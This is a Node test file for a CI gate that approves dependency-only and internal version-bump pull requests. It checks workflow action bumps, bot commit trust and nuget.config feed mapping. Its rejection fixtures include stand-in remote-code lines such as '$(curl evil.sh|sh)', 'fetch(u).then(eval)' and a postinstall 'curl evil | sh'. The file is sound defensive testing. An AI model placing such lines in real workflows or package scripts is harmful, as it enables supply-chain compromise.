import { test } from 'node:test';
import assert from 'node:assert/strict';
import { isDependencyOnlyChange, isInternalBumpOnly, nugetConfigPinsInternal, commitsAreTrusted, FILES_API_CAP, COMMITS_CAP, APP_NAME, APP_EMAIL } from './dependency-only.mjs';

const f = (filename, extra = {}) => ({ filename, status: 'modified', ...extra });
const wf = (patch, extra = {}) => f('.github/workflows/ci.yml', { patch, ...extra });
const exempt = (files) => isDependencyOnlyChange(files).dependencyOnly;
const bump = (o, n, dash = '- ') =>
  `@@ -1,3 +1,3 @@\n ctx\n-      ${dash}uses: ${o}\n+      ${dash}uses: ${n}\n ctx`;

test('manifest and lockfile bump is dependency-only', () => {
  assert.equal(exempt([f('package.json'), f('yarn.lock')]), true);
});

test('nested manifests and .NET files qualify', () => {
  const names = ['src/app/package.json', 'pnpm-lock.yaml', 'npm-shrinkwrap.json', 'package-lock.json',
    'src/A/A.csproj', 'Directory.Packages.props', 'Directory.Build.props', 'src/packages.lock.json', 'global.json'];
  assert.equal(exempt(names.map((n) => f(n))), true);
});

test('a source file rules it out and is named', () => {
  assert.deepEqual(isDependencyOnlyChange([f('package.json'), f('src/index.ts')]), { dependencyOnly: false, offending: 'src/index.ts' });
});

test('lookalike names do not qualify (package.json.sh, foo.csproj.bak)', () => {
  assert.equal(exempt([f('package.json.sh')]), false);
  assert.equal(exempt([f('foo.csproj.bak')]), false);
  assert.equal(exempt([f('scripts/yarn.lock.js')]), false);
});

test('status removed of a dependency file is not exempt', () => {
  assert.equal(exempt([f('package.json', { status: 'removed' })]), false);
});

test('non-array and empty input are not exempt', () => {
  assert.equal(exempt(null), false);
  assert.equal(exempt('package.json'), false);
  assert.equal(exempt([]), false);
});

test('possibly truncated listing is not exempt', () => {
  assert.equal(exempt(Array.from({ length: FILES_API_CAP }, (_, i) => f(`d${i}/package.json`))), false);
});

test('rename with previous_filename, renamed status, and previous_filename equal to filename', () => {
  assert.equal(exempt([f('package.json', { status: 'renamed', previous_filename: 'x/y.js' })]), false);
  assert.equal(exempt([f('package.json', { status: 'renamed', previous_filename: 'package.json' })]), false);
  assert.equal(exempt([f('package.json', { previous_filename: 'package.json' })]), true);
  assert.equal(exempt([wf(bump('actions/checkout@v6', 'actions/checkout@v7'), { status: 'renamed', previous_filename: '.github/workflows/old.yml' })]), false);
});

test('ref-only bump accepted', () => {
  assert.equal(exempt([wf(bump('actions/checkout@v6', 'actions/checkout@v7'))]), true);
});

test('SHA pin with trailing comment bump accepted', () => {
  const a = 'actions/checkout@' + 'a'.repeat(40) + ' # v6';
  const b = 'actions/checkout@' + 'b'.repeat(40) + ' # v7';
  assert.equal(exempt([wf(bump(a, b))]), true);
});

test('uses without list dash accepted when paired; sub-path actions accepted', () => {
  assert.equal(exempt([wf(bump('a/b@v1', 'a/b@v2', ''))]), true);
  assert.equal(exempt([wf(bump('a/b/sub/x@v1', 'a/b/sub/x@v2'))]), true);
});

test('new step (pure addition) rejected', () => {
  assert.equal(exempt([wf('@@ -1,2 +1,3 @@\n ctx\n+      - uses: evil/x@v1\n ctx')]), false);
});

test('retargeting to another owner rejected', () => {
  assert.equal(exempt([wf(bump('actions/checkout@v6', 'evil/checkout@v6'))]), false);
});

test('run-block injection rejected', () => {
  assert.equal(exempt([wf('@@ -1,2 +1,3 @@\n       run: |\n+        uses: $(curl evil.sh|sh)\n ctx')]), false);
});

test('github-script injection rejected', () => {
  assert.equal(exempt([wf('@@ -1,2 +1,3 @@\n       script: |\n+        uses: fetch(u).then(eval)\n ctx')]), false);
});

test('removal-only patch rejected', () => {
  assert.equal(exempt([wf('@@ -1,3 +1,2 @@\n ctx\n-      - uses: actions/hardening@v1\n ctx')]), false);
});

test('extra characters after the ref rejected', () => {
  assert.equal(exempt([wf(bump('a/b@v1', 'a/b@v2;curl evil'))]), false);
  assert.equal(exempt([wf(bump('a/b@v1', 'a/b@v2 && x'))]), false);
});

test('docker:// and local actions rejected', () => {
  assert.equal(exempt([wf(bump('docker://alpine:3.18', 'docker://alpine:3.19'))]), false);
  assert.equal(exempt([wf(bump('./local@v1', './local@v2'))]), false);
});

test('indentation or list-dash change within a pair rejected', () => {
  assert.equal(exempt([wf('@@ -1 +1 @@\n-      - uses: a/b@v1\n+    - uses: a/b@v2')]), false);
  assert.equal(exempt([wf('@@ -1 +1 @@\n-      - uses: a/b@v1\n+      uses: a/b@v2')]), false);
});

test('mismatched counts rejected', () => {
  assert.equal(exempt([wf('@@ -1 +1,2 @@\n-      - uses: a/b@v1\n+      - uses: a/b@v2\n+      - uses: a/c@v2')]), false);
});

test('.yaml extension and workflow in a subfolder are not exempt', () => {
  const p = bump('a/b@v1', 'a/b@v2');
  assert.equal(exempt([f('.github/workflows/ci.yaml', { patch: p })]), false);
  assert.equal(exempt([f('.github/workflows/sub/ci.yml', { patch: p })]), false);
});

test('context-only patch, missing patch, status removed/added workflow rejected', () => {
  assert.equal(exempt([wf('@@ -1,2 +1,2 @@\n ctx\n ctx')]), false);
  assert.equal(exempt([f('.github/workflows/ci.yml')]), false);
  assert.equal(exempt([wf(bump('a/b@v1', 'a/b@v2'), { status: 'removed' })]), false);
  assert.equal(exempt([wf(bump('a/b@v1', 'a/b@v2'), { status: 'added' })]), false);
});

// ---- commitsAreTrusted (fixtures mirror the live GET /pulls/{n}/commits shapes) ----
const EX = ['dependabot[bot]', 'renovate[bot]'];
const dependabotCommit = (over = {}) => ({
  author: { login: 'dependabot[bot]' },
  committer: { login: 'web-flow' },
  commit: {
    author: { name: 'dependabot[bot]', email: '49699333+dependabot[bot]@users.noreply.github.com' },
    committer: { name: 'GitHub', email: 'noreply@github.com' },
    verification: { verified: true, reason: 'valid' },
  },
  ...over,
});
const pinAppCommit = (who = {}) => ({
  author: null,
  committer: null,
  commit: {
    author: { name: APP_NAME, email: APP_EMAIL, ...who.author },
    committer: { name: APP_NAME, email: APP_EMAIL, ...who.committer },
    verification: { verified: false, reason: 'unsigned' },
  },
});
const humanCommit = (login = 'alice') => ({
  author: { login },
  committer: { login: 'web-flow' },
  commit: { author: { name: login, email: login + '@example.com' }, committer: { name: 'GitHub', email: 'noreply@github.com' }, verification: { verified: true, reason: 'valid' } },
});
const manifests = [f('package.json'), f('yarn.lock'), f('sub/package-lock.json')];
const trusted = (commits, files = manifests, headSha) => commitsAreTrusted(commits, files, EX, headSha);

test('verified Dependabot commit is trusted whatever files it touches', () => {
  assert.equal(trusted([dependabotCommit()], [f('src/a.ts')]), true);
});

test('Dependabot commit with verified false or missing verification is not trusted', () => {
  const unverified = dependabotCommit();
  unverified.commit.verification = { verified: false, reason: 'unsigned' };
  assert.equal(trusted([unverified]), false);
  const missing = dependabotCommit();
  delete missing.commit.verification;
  assert.equal(trusted([missing]), false);
});

test('login case variants are matched case-insensitively', () => {
  assert.equal(trusted([dependabotCommit({ author: { login: 'Dependabot[bot]' } })]), true);
  assert.equal(trusted([dependabotCommit({ author: { login: 'RENOVATE[BOT]' } })]), true);
});

test('pin app commit with null author login is trusted when files are manifest-only', () => {
  assert.equal(trusted([dependabotCommit(), pinAppCommit()]), true);
});

test('pin app identity with a differing author or committer email or name is not trusted', () => {
  assert.equal(trusted([pinAppCommit({ author: { email: 'evil@example.com' } })]), false);
  assert.equal(trusted([pinAppCommit({ committer: { email: 'evil@example.com' } })]), false);
  assert.equal(trusted([pinAppCommit({ committer: { name: 'someone' } })]), false);
  assert.equal(trusted([pinAppCommit({ author: { name: 'someone' } })]), false);
});

test('pin app identity with a .mjs or removed or renamed manifest in the files is not trusted', () => {
  assert.equal(trusted([pinAppCommit()], [f('package.json'), f('x.mjs')]), false);
  assert.equal(trusted([pinAppCommit()], [f('package.json', { status: 'removed' })]), false);
  assert.equal(trusted([pinAppCommit()], [f('package.json', { status: 'renamed' })]), false);
});

test('human commit and human merge commit are not trusted', () => {
  assert.equal(trusted([dependabotCommit(), humanCommit('alice')]), false);
  assert.equal(trusted([dependabotCommit(), humanCommit('bob')]), false);
});

test('missing or null commit, author or committer data is not trusted', () => {
  assert.equal(trusted([null]), false);
  assert.equal(trusted([{ author: { login: 'dependabot[bot]' } }]), false);
  assert.equal(trusted([{ author: null, commit: {} }]), false);
  assert.equal(trusted([{ author: null, commit: { author: { name: APP_NAME, email: APP_EMAIL } } }]), false);
});

test('empty, non-array and 250 commits are not trusted', () => {
  assert.equal(trusted([]), false);
  assert.equal(trusted(null), false);
  assert.equal(trusted(Array.from({ length: COMMITS_CAP }, () => dependabotCommit())), false);
  assert.equal(trusted(Array.from({ length: COMMITS_CAP - 1 }, () => dependabotCommit())), true);
});

test('Dependabot author with a human committer and a valid signature is NOT trusted (forged author)', () => {
  const forged = dependabotCommit({ committer: { login: 'alice' } });
  forged.commit.committer = { name: 'Alice', email: 'alice@example.com' };
  assert.equal(trusted([forged]), false);
  const humanEmailOnly = dependabotCommit();
  humanEmailOnly.commit.committer = { name: 'Alice', email: 'alice@example.com' };
  assert.equal(trusted([humanEmailOnly]), false);
  const loginOnly = dependabotCommit({ committer: { login: 'alice' } });
  assert.equal(trusted([loginOnly]), false);
});

test('signature reason other than valid is not trusted', () => {
  const c = dependabotCommit();
  c.commit.verification = { verified: true, reason: 'expired_key' };
  assert.equal(trusted([c]), false);
});

test('Update branch merge commit (committer web-flow, author the human) is not trusted', () => {
  const merge = humanCommit('alice');
  merge.committer = { login: 'web-flow' };
  assert.equal(trusted([dependabotCommit(), merge]), false);
});

test('pin app commits alone are not trusted; order matters', () => {
  assert.equal(trusted([pinAppCommit()]), false);
  assert.equal(trusted([pinAppCommit(), pinAppCommit()]), false);
  assert.equal(trusted([dependabotCommit(), pinAppCommit()]), true);
  assert.equal(trusted([pinAppCommit(), dependabotCommit()]), false);
});

test('headSha must equal the last commit sha when given', () => {
  const a = { ...dependabotCommit(), sha: 'aaa' };
  const b = { ...pinAppCommit(), sha: 'bbb' };
  assert.equal(trusted([a, b], manifests, 'bbb'), true);
  assert.equal(trusted([a, b], manifests, 'aaa'), false);
  assert.equal(trusted([a, b], manifests, 'ccc'), false);
});

// ---- uses: line hardening ----
test('comment tail: spaced harmless comment accepted, glued or metacharacter comments rejected', () => {
  assert.equal(exempt([wf(bump('a/b@v1', 'a/b@v2 # v2.1.0'))]), true);
  assert.equal(exempt([wf(bump('a/b@v1', 'a/b@v2#$(curl)'))]), false);
  assert.equal(exempt([wf(bump('a/b@v1', 'a/b@v2 # $(x)'))]), false);
  assert.equal(exempt([wf(bump('a/b@v1', 'a/b@v2 # `x`'))]), false);
  assert.equal(exempt([wf(bump('a/b@v1', 'a/b@v2 #`x`'))]), false);
});

test('quotes must balance and match', () => {
  assert.equal(exempt([wf(bump('"a/b@v1"', '"a/b@v2"'))]), true);
  assert.equal(exempt([wf(bump("'a/b@v1'", "'a/b@v2'"))]), true);
  assert.equal(exempt([wf(bump('"a/b@v1', '"a/b@v2'))]), false);
  assert.equal(exempt([wf(bump('"a/b@v1"', '"a/b@v2\''))]), false);
  assert.equal(exempt([wf(bump('a/b@v1', 'a/b@v2"'))]), false);
});

test('pairs must be adjacent within a hunk', () => {
  const moved = '@@ -1,3 +1,2 @@\n ctx\n-      - uses: a/b@v1\n ctx\n@@ -20,2 +19,3 @@\n ctx\n+      - uses: a/b@v2\n ctx';
  assert.equal(exempt([wf(moved)]), false);
  const split = '@@ -1,4 +1,4 @@\n-      - uses: a/b@v1\n ctx\n+      - uses: a/b@v2\n ctx';
  assert.equal(exempt([wf(split)]), false);
  assert.equal(exempt([wf(bump('a/b@v1', 'a/b@v2'))]), true);
  const two = '@@ -1,4 +1,4 @@\n-      - uses: a/b@v1\n-      - uses: c/d@v1\n+      - uses: a/b@v2\n+      - uses: c/d@v2\n ctx';
  assert.equal(exempt([wf(two)]), true);
  const twoRuns = '@@ -1,5 +1,5 @@\n-      - uses: a/b@v1\n+      - uses: a/b@v2\n ctx\n-      - uses: c/d@v1\n+      - uses: c/d@v2';
  assert.equal(exempt([wf(twoRuns)]), true);
});

// ---- isInternalBumpOnly (patches mirror EasyLife365-Collaboration#5153 and #4885) ----
// The files API gives every file its additions and deletions; the fixtures get them from their own patch.
const counted = (file) => {
  if (!file || typeof file.patch !== 'string') return file;
  const lines = file.patch.split('\n');
  return { additions: lines.filter((l) => l.startsWith('+')).length, deletions: lines.filter((l) => l.startsWith('-')).length, ...file };
};
const internal = (files) => isInternalBumpOnly(Array.isArray(files) ? files.map(counted) : files).internalBump;
const sha = (c) => c.repeat(40);
const pkg = (o, n, { indent = '    ', comma = ',', name = '@easylife365/react' } = {}) =>
  f('package.json', { patch: `@@ -51,7 +51,7 @@\n   "dependencies": {\n-${indent}"${name}": "${o}"${comma}\n+${indent}"${name}": "${n}"${comma}\n     "@fortawesome/fontawesome-svg-core": "7.3.1",` });
const entry = (sign, v, { name = '@easylife365/react', header = true, spec = v, host = 'npm.pkg.github.com/download', hash = 'a' } = {}) =>
  [
    header ? `${sign}"${name}@${spec}":` : null,
    `${sign}  version "${v}"`,
    `${sign}  resolved "https://${host}/${name}/${v}/${sha(hash)}#${sha(hash)}"`,
    `${sign}  integrity sha512-/rWz92ul/ZpYX9/LxTEBKhuCair+RFKVC54elXlOa+KbSMPLDLZyAS06FgKSJhyuvmBawP+1esreG6ksAnjKqA==`,
  ].filter((l) => l !== null).join('\n');
const lock = (o, n, opts = {}) =>
  f('yarn.lock', { patch: `@@ -388,10 +388,10 @@\n   integrity sha512-OoKo==\n \n${entry('-', o, opts)}\n${entry('+', n, { ...opts, hash: 'b' })}\n   dependencies:\n     dompurify "3.4.17"` });
const csproj = (o, n, { name = 'EL.Core.API', element = 'PackageReference', path = 'Core/EL.API/EL.API.csproj' } = {}) =>
  f(path, { patch: `@@ -10,3 +10,3 @@\n   <ItemGroup>\n-    <${element} Include="${name}" Version="${o}" />\n+    <${element} Include="${name}" Version="${n}" />\n   </ItemGroup>` });

test('internal bump: the React bump of package.json files and the yarn.lock entry passes', () => {
  assert.equal(internal([f('Shared/x/package.json', { patch: pkg('0.15.3', '0.15.4', { comma: '' }).patch }), pkg('0.15.3', '0.15.4'), lock('0.15.3', '0.15.4')]), true);
});

test('internal bump: a caret range moves with both lock headers; an entry without a header change passes', () => {
  const both = f('yarn.lock', { patch: `@@ -1,4 +1,4 @@\n${entry('-', '0.15.3', { spec: '^0.15.3' })}\n${entry('+', '0.16.0', { spec: '^0.16.0', hash: 'b' })}` });
  assert.equal(internal([pkg('^0.15.3', '^0.16.0'), both]), true);
  const stale = f('yarn.lock', { patch: `@@ -1,4 +1,4 @@\n${entry('-', '0.15.3', { spec: '^0.15.3' })}\n${entry('+', '0.16.0', { spec: '^0.15.3', hash: 'b' })}` });
  assert.equal(internal([stale]), false);
  const prefix = f('yarn.lock', { patch: `@@ -1,4 +1,4 @@\n${entry('-', '0.15.3', { spec: '^0.15.3' })}\n${entry('+', '0.16.0', { spec: '0.16.0', hash: 'b' })}` });
  assert.equal(internal([prefix]), false);
  assert.equal(internal([lock('0.15.3', '0.15.4', { header: false })]), true);
});

test('internal bump: EL.* PackageReference and PackageVersion bumps pass, CRLF lines too', () => {
  assert.equal(internal([csproj('5.15.1', '5.17.1'), csproj('5.15.1', '5.17.1', { element: 'PackageVersion', path: 'Directory.Packages.props' })]), true);
  const crlf = f('a.csproj', { patch: '@@ -1 +1 @@\n-    <PackageReference Include="EL.Core" Version="5.15.1" />\r\n+    <PackageReference Include="EL.Core" Version="5.17.1" />\r' });
  assert.equal(internal([crlf]), true);
});

test('internal bump: a lower, equal or prerelease version is reviewed', () => {
  assert.equal(internal([pkg('0.15.4', '0.15.3')]), false);
  assert.equal(internal([pkg('0.15.4', '0.15.4')]), false);
  assert.equal(internal([pkg('0.15.4', '0.16.0-collab5153')]), false);
  assert.equal(internal([csproj('5.17.1', '5.15.1')]), false);
  assert.equal(internal([csproj('5.15.1', '5.17.1-core12')]), false);
  assert.equal(internal([lock('0.15.4', '0.15.3')]), false);
  assert.equal(internal([pkg('0.9.0', '0.10.0')]), true, 'versions compare as numbers, not text');
});

test('internal bump: another package, another scope or a lookalike is reviewed', () => {
  assert.equal(internal([pkg('7.3.1', '7.4.0', { name: '@fortawesome/fontawesome-svg-core' })]), false);
  assert.equal(internal([pkg('1.0.0', '1.0.1', { name: '@easylife365x/react' })]), false);
  assert.equal(internal([csproj('1.0.0', '1.0.1', { name: 'Newtonsoft.Json' })]), false);
  assert.equal(internal([csproj('1.0.0', '1.0.1', { name: 'ELX.Core' })]), false);
});

test('internal bump: a renamed package, a changed range prefix, indent or comma is reviewed', () => {
  const renamed = f('package.json', { patch: '@@ -1 +1 @@\n-    "@easylife365/react": "0.15.3",\n+    "@easylife365/core": "0.15.4",' });
  assert.equal(internal([renamed]), false);
  assert.equal(internal([pkg('0.15.3', '^0.15.4')]), false);
  const indent = f('package.json', { patch: '@@ -1 +1 @@\n-    "@easylife365/react": "0.15.3",\n+  "@easylife365/react": "0.15.4",' });
  assert.equal(internal([indent]), false);
  const comma = f('package.json', { patch: '@@ -1 +1 @@\n-    "@easylife365/react": "0.15.3",\n+    "@easylife365/react": "0.15.4"' });
  assert.equal(internal([comma]), false);
});

test('internal bump: any other changed line in package.json is reviewed', () => {
  const script = f('package.json', { patch: '@@ -1,2 +1,2 @@\n-    "@easylife365/react": "0.15.3",\n-    "postinstall": "yarn build"\n+    "@easylife365/react": "0.15.4",\n+    "postinstall": "curl evil | sh"' });
  assert.equal(internal([script]), false);
  const added = f('package.json', { patch: '@@ -1,1 +1,2 @@\n ctx\n+    "@easylife365/react": "0.15.4",' });
  assert.equal(internal([added]), false);
  const removed = f('package.json', { patch: '@@ -1,2 +1,1 @@\n ctx\n-    "@easylife365/react": "0.15.3",' });
  assert.equal(internal([removed]), false);
  const interleaved = f('package.json', { patch: '@@ -1,2 +1,2 @@\n-    "@easylife365/a": "1.0.0",\n+    "@easylife365/a": "1.0.1",\n-    "@easylife365/b": "1.0.0",\n+    "@easylife365/b": "1.0.1",' });
  assert.equal(internal([interleaved]), false);
});

test('internal bump: the lock entry must stay on GitHub Packages and keep its dependency list', () => {
  assert.equal(internal([lock('0.15.3', '0.15.4', { host: 'registry.yarnpkg.com' })]), false);
  assert.equal(internal([lock('0.15.3', '0.15.4', { host: 'npm.pkg.github.com.evil.io/download' })]), false);
  const deps = f('yarn.lock', { patch: `@@ -1,6 +1,6 @@\n${entry('-', '0.15.3')}\n${entry('+', '0.15.4', { hash: 'b' })}\n   dependencies:\n-    dompurify "3.4.17"\n+    dompurify "3.5.0"` });
  assert.equal(internal([deps]), false);
  const newEntry = f('yarn.lock', { patch: `@@ -1,4 +1,9 @@\n${entry('-', '0.15.3')}\n${entry('+', '0.15.4', { hash: 'b' })}\n \n+"left-pad@1.3.0":\n+  version "1.3.0"\n+  resolved "https://registry.yarnpkg.com/left-pad/-/left-pad-1.3.0.tgz#x"\n+  integrity sha512-a==` });
  assert.equal(internal([newEntry]), false);
});

test('internal bump: a lock run whose version, resolved and header disagree is reviewed', () => {
  const mismatch = f('yarn.lock', { patch: `@@ -1,4 +1,4 @@\n${entry('-', '0.15.3')}\n+"@easylife365/react@0.15.4":\n+  version "0.15.4"\n+  resolved "https://npm.pkg.github.com/download/@easylife365/react/0.15.5/${sha('b')}#${sha('b')}"\n+  integrity sha512-a==` });
  assert.equal(internal([mismatch]), false);
  const otherName = f('yarn.lock', { patch: `@@ -1,4 +1,4 @@\n${entry('-', '0.15.3')}\n${entry('+', '0.15.4', { name: '@easylife365/core', hash: 'b' })}` });
  assert.equal(internal([otherName]), false);
  const headerOnOneSide = f('yarn.lock', { patch: `@@ -1,4 +1,4 @@\n${entry('-', '0.15.3', { header: false })}\n${entry('+', '0.15.4', { hash: 'b' })}` });
  assert.equal(internal([headerOnOneSide]), false);
});

test('internal bump: any other file, a missing patch, a rename or a new file is reviewed', () => {
  assert.equal(internal([pkg('0.15.3', '0.15.4'), f('AGENTS.md', { patch: '@@ -1 +1 @@\n-Core 5.15.1\n+Core 5.17.1' })]), false);
  assert.equal(internal([f('package.json')]), false);
  assert.equal(internal([{ ...pkg('0.15.3', '0.15.4'), status: 'added' }]), false);
  assert.equal(internal([{ ...pkg('0.15.3', '0.15.4'), status: 'renamed', previous_filename: 'x/package.json' }]), false);
  assert.equal(internal([{ ...csproj('1.0.0', '1.0.1'), filename: 'nuget.config' }]), false);
  assert.equal(internal([f('package.json', { patch: '@@ -1,2 +1,2 @@\n ctx\n ctx' })]), false);
});

test('internal bump: empty, non-array, nameless and truncated listings are reviewed', () => {
  assert.equal(internal(null), false);
  assert.equal(internal([]), false);
  assert.equal(internal([null]), false);
  assert.equal(internal(Array.from({ length: FILES_API_CAP }, () => pkg('0.15.3', '0.15.4'))), false);
  assert.deepEqual(isInternalBumpOnly([pkg('0.15.3', '0.15.4'), f('src/a.ts', { patch: '' })].map(counted)), { internalBump: false, offending: 'src/a.ts' });
});

test('internal bump: a patch that does not add up to the file counts (cut off, or no counts) is reviewed', () => {
  const file = counted(pkg('0.15.3', '0.15.4'));
  assert.equal(isInternalBumpOnly([file]).internalBump, true);
  assert.equal(isInternalBumpOnly([{ ...file, additions: 2 }]).internalBump, false);
  assert.equal(isInternalBumpOnly([{ ...file, deletions: 0 }]).internalBump, false);
  const { additions, deletions, ...noCounts } = file;
  assert.equal(isInternalBumpOnly([noCounts]).internalBump, false);
});

test('internal bump: says when a NuGet file moved, so the caller checks nuget.config', () => {
  assert.deepEqual(isInternalBumpOnly([pkg('0.15.3', '0.15.4'), lock('0.15.3', '0.15.4')].map(counted)), { internalBump: true, nuget: false });
  assert.deepEqual(isInternalBumpOnly([csproj('5.15.1', '5.17.1')].map(counted)), { internalBump: true, nuget: true });
  assert.equal(isInternalBumpOnly([csproj('5.15.1', '5.17.1', { path: 'Directory.Packages.props', element: 'PackageVersion' })].map(counted)).nuget, true);
});

test('internal bump: several adjacent lines in one run pass when each pair is a bump', () => {
  const two = f('package.json', { patch: '@@ -1,2 +1,2 @@\n-    "@easylife365/react": "0.15.3",\n-    "@easylife365/react-core": "0.15.3",\n+    "@easylife365/react": "0.15.4",\n+    "@easylife365/react-core": "0.15.4",' });
  assert.equal(internal([two]), true);
  const swapped = f('package.json', { patch: '@@ -1,2 +1,2 @@\n-    "@easylife365/react": "0.15.3",\n-    "@easylife365/react-core": "0.15.3",\n+    "@easylife365/react-core": "0.15.4",\n+    "@easylife365/react": "0.15.4",' });
  assert.equal(internal([swapped]), false);
  const nuget = f('a.csproj', { patch: '@@ -1,2 +1,2 @@\n-    <PackageReference Include="EL.Core" Version="5.15.1" />\n-    <PackageReference Include="EL.Core.API" Version="5.15.1" />\n+    <PackageReference Include="EL.Core" Version="5.17.1" />\n+    <PackageReference Include="EL.Core.API" Version="5.17.1" />' });
  assert.equal(internal([nuget]), true);
});

test('internal bump: the lock hash in the path and the fragment must be the same', () => {
  const other = f('yarn.lock', { patch: `@@ -1,4 +1,4 @@\n${entry('-', '0.15.3')}\n+"@easylife365/react@0.15.4":\n+  version "0.15.4"\n+  resolved "https://npm.pkg.github.com/download/@easylife365/react/0.15.4/${sha('b')}#${sha('c')}"\n+  integrity sha512-a==` });
  assert.equal(internal([other]), false);
});

test('internal bump: only spaces and tabs count as whitespace', () => {
  const nbsp = f('package.json', { patch: '@@ -1 +1 @@\n-    "@easylife365/react": "0.15.3",\n+    "@easylife365/react": "0.15.4",' });
  assert.equal(internal([nbsp]), false);
  const extraAttribute = f('a.csproj', { patch: '@@ -1 +1 @@\n-    <PackageReference Include="EL.Core" Version="5.15.1" PrivateAssets="all" />\n+    <PackageReference Include="EL.Core" Version="5.17.1" PrivateAssets="all" />' });
  assert.equal(internal([extraAttribute]), false);
});

// ---- nugetConfigPinsInternal (the shape of EasyLife365-Collaboration/nuget.config) ----
const nugetConfig = ({ mapping = true, elSource = 'Github', extra = '', githubUrl = 'https://nuget.pkg.github.com/EasyLife365/index.json' } = {}) => `<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <packageSources>
    <!-- a comment with <packageSourceMapping> in it is ignored -->
    <clear />
    <add key="NuGet official package source" value="https://api.nuget.org/v3/index.json" />
    <add key="Github" value="${githubUrl}" />
  </packageSources>
  ${mapping ? `<packageSourceMapping>
    <packageSource key="${elSource}">
      <package pattern="EL.*" />
    </packageSource>
    <packageSource key="NuGet official package source">
      <package pattern="*" />${extra}
    </packageSource>
  </packageSourceMapping>` : ''}
</configuration>`;

test('nuget.config: EL.* mapped to the EasyLife365 feed passes, in every file', () => {
  assert.equal(nugetConfigPinsInternal([nugetConfig()]), true);
  assert.equal(nugetConfigPinsInternal([nugetConfig(), nugetConfig()]), true);
});

test('nuget.config: no mapping, EL.* on nuget.org, another feed URL or an EL. pattern on nuget.org fails', () => {
  assert.equal(nugetConfigPinsInternal([nugetConfig({ mapping: false })]), false);
  assert.equal(nugetConfigPinsInternal([nugetConfig(), nugetConfig({ mapping: false })]), false);
  assert.equal(nugetConfigPinsInternal([nugetConfig({ elSource: 'NuGet official package source' })]), false);
  assert.equal(nugetConfigPinsInternal([nugetConfig({ githubUrl: 'https://nuget.pkg.github.com/Other/index.json' })]), false);
  assert.equal(nugetConfigPinsInternal([nugetConfig({ extra: '\n      <package pattern="EL.Core.*" />' })]), false);
  assert.equal(nugetConfigPinsInternal([nugetConfig({ extra: '\n      <package pattern="el.core.api" />' })]), false);
});

test('nuget.config: a clear in the mapping, a source defined twice, no file or not text fails', () => {
  assert.equal(nugetConfigPinsInternal([nugetConfig().replace('<packageSourceMapping>\n', '<packageSourceMapping>\n    <clear />\n')]), false);
  assert.equal(nugetConfigPinsInternal([nugetConfig().replace('<clear />', '<add key="Github" value="https://api.nuget.org/v3/index.json" />')]), false);
  assert.equal(nugetConfigPinsInternal([]), false);
  assert.equal(nugetConfigPinsInternal(null), false);
  assert.equal(nugetConfigPinsInternal([null]), false);
});
